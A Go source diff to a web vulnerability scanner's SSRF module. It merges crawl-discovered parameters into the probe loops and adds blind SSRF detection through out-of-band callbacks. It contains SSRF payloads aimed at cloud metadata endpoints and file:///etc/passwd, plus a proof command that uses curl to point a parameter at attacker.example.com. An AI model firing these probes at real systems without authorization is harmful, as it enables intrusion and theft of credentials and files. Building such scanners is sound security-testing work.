@@ -18,9 +18,11 @@ import (
 	"github.com/stormbane-security/beacon/internal/evasion"
 	"github.com/stormbane-security/beacon/internal/finding"
 	"github.com/stormbane-security/beacon/internal/module"
+	"github.com/stormbane-security/beacon/internal/oob"
 	"github.com/stormbane-security/beacon/internal/postexploit"
 	"github.com/stormbane-security/beacon/internal/scan"
 	"github.com/stormbane-security/beacon/internal/scanner/authctx"
+	"github.com/stormbane-security/beacon/internal/scanner/paramdiscovery"
 )
 
 
@@ -148,10 +150,17 @@ func (s *Scanner) Run(ctx context.Context, asset string, scanType module.ScanTyp
 	scheme := detectScheme(ctx, client, asset)
 	base := scheme + "://" + asset
 
+	// Merge discovered parameters from crawl results.
+	effectivePaths := probePaths
+	effectiveParams := probeParams
+	if discovered := paramdiscovery.DiscoveredParamsFromContext(ctx); len(discovered) > 0 {
+		effectivePaths, effectiveParams = mergeDiscoveredSSRF(probePaths, probeParams, discovered)
+	}
+
 	var findings []finding.Finding
 
-	for _, probePath := range probePaths {
-		for _, param := range probeParams {
+	for _, probePath := range effectivePaths {
+		for _, param := range effectiveParams {
 			for _, payload := range allMetadataPayloads {
 				u := base + probePath + "?" + param + "=" + url.QueryEscape(payload)
 				req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
@@ -220,8 +229,8 @@ func (s *Scanner) Run(ctx context.Context, asset string, scanType module.ScanTyp
 	// server-side, the Location header will contain a metadata IP. While this
 	// is technically an open redirect, redirecting to cloud metadata IPs is a
 	// well-known SSRF escalation pattern (e.g. IMDS via 302 redirect on ELB).
-	for _, probePath := range probePaths {
-		for _, param := range probeParams {
+	for _, probePath := range effectivePaths {
+		for _, param := range effectiveParams {
 			for _, payload := range allMetadataPayloads {
 				u := base + probePath + "?" + param + "=" + url.QueryEscape(payload)
 				req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
@@ -287,8 +296,8 @@ func (s *Scanner) Run(ctx context.Context, asset string, scanType module.ScanTyp
 	// non-standard headers, so the main loop above tests without it. Here we
 	// probe explicitly with the header to catch servers that do forward it.
 	azurePayload := "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
-	for _, probePath := range probePaths {
-		for _, param := range probeParams {
+	for _, probePath := range effectivePaths {
+		for _, param := range effectiveParams {
 			u := base + probePath + "?" + param + "=" + url.QueryEscape(azurePayload)
 			req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
 			if err != nil {
@@ -355,8 +364,8 @@ func (s *Scanner) Run(ctx context.Context, asset string, scanType module.ScanTyp
 		{"file:///etc/passwd", "root:", "local file read via file:// protocol"},
 		{"file:///c:/windows/win.ini", "[fonts]", "local file read via file:// protocol (Windows)"},
 	}
-	for _, probePath := range probePaths {
-		for _, param := range probeParams {
+	for _, probePath := range effectivePaths {
+		for _, param := range effectiveParams {
 			for _, pp := range protocolPayloads {
 				u := base + probePath + "?" + param + "=" + url.QueryEscape(pp.url)
 				req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
@@ -407,6 +416,84 @@ func (s *Scanner) Run(ctx context.Context, asset string, scanType module.ScanTyp
 					DiscoveredAt: time.Now(),
 				})
 				break
+			}
+		}
+	}
+
+	// ── Blind SSRF via OOB callback ──────────────────────────────────────
+	// If the OOB server is available, inject callback URLs into the same
+	// parameters to detect blind SSRF where the server fetches the URL but
+	// doesn't reflect the response body.
+	if oobSrv := oob.FromContext(ctx); oobSrv != nil {
+		type oobProbe struct {
+			token string
+			path  string
+			param string
+		}
+		var probes []oobProbe
+
+		for _, probePath := range probePaths {
+			for _, param := range probeParams {
+				if ctx.Err() != nil {
+					break
+				}
+
+				token := oob.MakeToken(oobSrv, "ssrf", asset, fmt.Sprintf("blind-%s-%s", probePath, param))
+				callbackURL := oob.PayloadURL(oobSrv, token)
+
+				u := base + probePath + "?" + param + "=" + url.QueryEscape(callbackURL)
+				req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
+				if err != nil {
+					continue
+				}
+				req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; BeaconScanner/1.0)")
+
+				resp, err := client.Do(req)
+				if err != nil {
+					continue
+				}
+				_, _ = io.Copy(io.Discard, io.LimitReader(resp.Body, 1024))
+				_ = resp.Body.Close()
+
+				probes = append(probes, oobProbe{token: token, path: probePath, param: param})
+			}
+		}
+
+		// Wait for callbacks after all probes are sent.
+		for _, p := range probes {
+			if ctx.Err() != nil {
+				break
+			}
+			if cb, ok := oobSrv.WaitForCallback(ctx, p.token, 10*time.Second); ok {
+				findings = append(findings, finding.Finding{
+					CheckID:    finding.CheckWebSSRF,
+					Module:     "deep",
+					Scanner:    scannerName,
+					Severity:   finding.SeverityCritical,
+					Confidence: finding.ConfidenceVerified,
+					Title:      fmt.Sprintf("Blind SSRF via parameter %q on %s%s (OOB callback)", p.param, asset, p.path),
+					Description: fmt.Sprintf(
+						"The parameter %q on %s%s accepted an attacker-controlled URL and the server "+
+							"made an HTTP request to the OOB callback server. Although the fetched content "+
+							"was not reflected in the response, the server-side request was confirmed via "+
+							"out-of-band callback from %s. An attacker can use this to scan internal "+
+							"networks, access cloud metadata, and exfiltrate data via DNS/HTTP.",
+						p.param, asset, p.path, cb.RemoteAddr),
+					Asset:    asset,
+					DeepOnly: true,
+					ProofCommand: fmt.Sprintf(
+						`curl -s "%s%s?%s=http://attacker.example.com/canary"`,
+						base, p.path, p.param),
+					Evidence: map[string]any{
+						"method":      "blind-oob",
+						"path":        p.path,
+						"param":       p.param,
+						"oob_token":   p.token,
+						"callback_ip": cb.RemoteAddr,
+						"protocol":    cb.Protocol,
+					},
+					DiscoveredAt: time.Now(),
+				})
 			}
 		}
 	}
@@ -478,6 +565,38 @@ func isMetadataRedirect(location string) bool {
 		}
 	}
 	return false
+}
+
+// mergeDiscoveredSSRF combines hardcoded probe paths and params with parameters
+// discovered from crawl results. Returns expanded paths and params lists.
+func mergeDiscoveredSSRF(hardcodedPaths, hardcodedParams []string, discovered map[string][]string) ([]string, []string) {
+	pathSet := make(map[string]bool, len(hardcodedPaths))
+	for _, p := range hardcodedPaths {
+		pathSet[p] = true
+	}
+	paramSet := make(map[string]bool, len(hardcodedParams))
+	for _, p := range hardcodedParams {
+		paramSet[p] = true
+	}
+
+	paths := make([]string, len(hardcodedPaths))
+	copy(paths, hardcodedPaths)
+	params := make([]string, len(hardcodedParams))
+	copy(params, hardcodedParams)
+
+	for path, newParams := range discovered {
+		if !pathSet[path] {
+			paths = append(paths, path)
+			pathSet[path] = true
+		}
+		for _, p := range newParams {
+			if !paramSet[p] {
+				params = append(params, p)
+				paramSet[p] = true
+			}
+		}
+	}
+	return paths, params
 }
 
 // detectScheme tries HTTPS first, falling back to HTTP.
